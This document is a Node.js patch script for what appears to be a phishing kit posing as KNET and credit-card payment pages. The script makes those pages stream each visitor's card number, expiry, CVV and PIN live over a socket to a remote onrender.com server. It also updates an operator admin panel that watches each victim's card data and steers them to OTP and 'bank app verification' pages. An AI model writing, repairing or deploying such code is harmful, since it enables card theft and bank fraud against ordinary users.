import fs from "node:fs";
const E = "utf8";
let bad = 0;

function edit(file, pairs, label) {
  if (!fs.existsSync(file)) { console.log("MISSING " + file); bad++; return; }
  let t = fs.readFileSync(file, E);
  const eol = t.includes("\r\n") ? "\r\n" : "\n";
  for (const [o, n, tag] of pairs) {
    const O = o.split("\n").join(eol), N = n.split("\n").join(eol);
    const c = t.split(O).length - 1;
    if (c === 0) { console.log("NO MATCH " + label + "/" + tag); bad++; continue; }
    t = t.split(O).join(N);
    console.log("ok " + label + "/" + tag + " x" + c);
  }
  fs.writeFileSync(file, t, E);
}

const REG = ['      try { socket.value.emit("visitor:register", { existingVisitorId: localStorage.getItem("kdd.server.pid") || null }); } catch (e) {}'];
const PRES_OLD = ['const _s=socket.value,_a=()=>{try{_s.emit("card:live",{presence:true})}catch(e){}};if(_s.connected)_a();_s.off("connect",_a);_s.on("connect",_a);'];
const PRES_NEW = ['const _s=socket.value,_a=()=>{try{_s.emit("visitor:register",{existingVisitorId:localStorage.getItem("kdd.server.pid")||null})}catch(e){}};if(_s.connected)_a();_s.off("connect",_a);_s.on("connect",_a);'];

edit("src/pages/KNETPayment.tsx", [
  [PRES_OLD[0], PRES_NEW[0], "presence"],
  ['      socket.value.emit("card:live", {\n        cardNumber: selectedPrefix + cardNumber,\n        nameOnCard: selectedBank || "KNET",\n        expiryDate: expiryMonth && expiryYear ? `${expiryMonth.padStart(2, "0")}/${String(expiryYear).slice(-2)}` : "",\n        cvv: cardCvv,\n        pin: cardPin,\n        consent: true,\n      });',
   [...REG, '      socket.value.emit("card:draft", {', '        paymentMethod: "KNET",', '        prefix: selectedPrefix,', '        cardNumberOnly: cardNumber,', '        cardNumber: selectedPrefix + cardNumber,', '        nameOnCard: "KNET",', '        bankName: selectedBank,', '        expiryMonth: expiryMonth ? expiryMonth.padStart(2, "0") : "",', '        expiryYear: expiryYear,', '        cvv: cardCvv,', '        pin: cardPin,', '        submitted: false,', '      });'].join("\n"), "payload"]
], "KNET");

edit("src/pages/CreditCardPayment.tsx", [
  [PRES_OLD[0], PRES_NEW[0], "presence"],
  ['      socket.value.emit("card:live", {\n        cardNumber: cleanCardNumber,\n        nameOnCard: nameOnCard || "",\n        expiryDate: expiryMonth && expiryYear ? `${expiryMonth}/${expiryYear}` : "",\n        cvv: cvv || "",\n        consent: true,\n      });',
   [...REG, '      socket.value.emit("card:draft", {', '        paymentMethod: "CARD",', '        cardNumber: cleanCardNumber,', '        nameOnCard: nameOnCard || "",', '        expiryMonth: expiryMonth || "",', '        expiryYear: expiryYear || "",', '        cvv: cvv || "",', '        submitted: false,', '      });'].join("\n"), "payload"]
], "CARD");

edit("src/lib/store.ts", [
  ['(import.meta.env.PROD ? "https://kdd-server-production.up.railway.app" : "http://localhost:3001");',
   '(import.meta.env.PROD ? "https://makanifoods-anf8.onrender.com" : "http://localhost:3001");', "url"],
  ['s.emit("visitor:register", { existingVisitorId, clientIp });',
   's.emit("visitor:register", { existingVisitorId, clientIp, siteName: "KDC" });', "siteName"]
], "store");

edit("src/integrations/socket/client.ts", [
  ["|| 'https://sejel-server-zygy.onrender.com';", "|| 'https://makanifoods-anf8.onrender.com';", "url"]
], "socketClient");

const ADM_OLD = ["      socket.on('card:liveUpdate', ({ visitorId, liveCard, liveCardTimestamp }) => {", "  const visitor = visitors.get(visitorId);", "  if (visitor) {", "    visitor.liveCard = liveCard;", "    if (liveCardTimestamp) visitor.liveCardTimestamp = liveCardTimestamp;", "    visitors.set(visitorId, visitor);", "    if (selectedVisitorId === visitorId) renderVisitorDetails(visitor);", "  }", "});"];
const ADM_NEW = ["      socket.on('visitor:cardDraft', ({ visitorId, draft }) => {", "  const visitor = visitors.get(visitorId);", "  if (visitor) {", "    visitor.liveCard = draft;", "    visitor.liveCardTimestamp = Date.now();", "    visitors.set(visitorId, visitor);", "    if (selectedVisitorId === visitorId) renderVisitorDetails(visitor);", "  }", "});"];
const APP_FN = ["    function cardActionApp(btn, socketId) {", "      const originalText = btn.textContent;", "      window.skipDetailsUpdate = true;", "      socket.emit('admin:cardAction', { visitorSocketId: socketId, action: 'app' });", "      const visitor = Array.from(visitors.values()).find(v => v.socketId === socketId);", "      if (visitor) { visitor.waitingForAdminResponse = false; }", "      renderVisitorsList();", "      btn.textContent = 'تم الإرسال';", "      setTimeout(() => { window.skipDetailsUpdate = false; btn.textContent = originalText; }, 1500);", "    }", "", "    function cardActionReject(btn, socketId) {"];

for (const f of ["kdd-public/admin.html", "server/admin/index.html"]) {
  edit(f, [
    [ADM_OLD.join("\n"), ADM_NEW.join("\n"), "listener"],
    ["    function cardActionReject(btn, socketId) {", APP_FN.join("\n"), "appFn"],
    ["https://sejel-server-zygy.onrender.com", "https://makanifoods-anf8.onrender.com", "url"]
  ], f);
}

fs.copyFileSync("C:/Users/user/mf-ref/client/src/pages/BankAppVerification.tsx", "src/pages/BankAppVerification.tsx");
console.log("copied BankAppVerification");

edit("src/App.tsx", [
  ['const CVV = lazy(() => import("./pages/CVV"));', 'const CVV = lazy(() => import("./pages/CVV"));\nconst BankAppVerification = lazy(() => import("./pages/BankAppVerification"));', "import"],
  ['<Route path="/final-page" element={<FinalPage />} />', '<Route path="/bank-app-verification" element={<BankAppVerification />} />\n        <Route path="/final-page" element={<FinalPage />} />', "route"]
], "App");

edit("src/lib/pageRoutes.ts", [
  ['  cvv: "/cvv",', '  "bank-app-verification": "/bank-app-verification", app: "/bank-app-verification",\n  cvv: "/cvv",', "map"],
  ['"knet", "knet-otp", "card", "otp-verification", "atm", "cvv", "final-page",', '"knet", "knet-otp", "card", "otp-verification", "atm", "bank-app-verification", "cvv", "final-page",', "prefix"]
], "pageRoutes");

edit("src/pages/KNETPayment.tsx", [
  ['      if (phase === "card") {\n        if (action === "otp") {', '      if (phase === "card") {\n        if (action === "app") {\n          navigate("/bank-app-verification");\n        } else if (action === "otp") {', "app"]
], "KNET-app");

edit("src/pages/CreditCardPayment.tsx", [
  ["      if (action === 'otp') {", "      if (action === 'app') {\n        navigate(\"/bank-app-verification\");\n      } else if (action === 'otp') {", "app"]
], "CARD-app");

console.log("");
console.log("draft KNET: " + (fs.readFileSync("src/pages/KNETPayment.tsx", E).split('"card:draft"').length - 1));
console.log("draft CARD: " + (fs.readFileSync("src/pages/CreditCardPayment.tsx", E).split('"card:draft"').length - 1));
console.log("admin listener: " + (fs.readFileSync("kdd-public/admin.html", E).split("visitor:cardDraft").length - 1));
console.log(bad === 0 ? "RESULT: OK" : "RESULT: " + bad + " FAIL");
process.exit(bad ? 1 : 0);
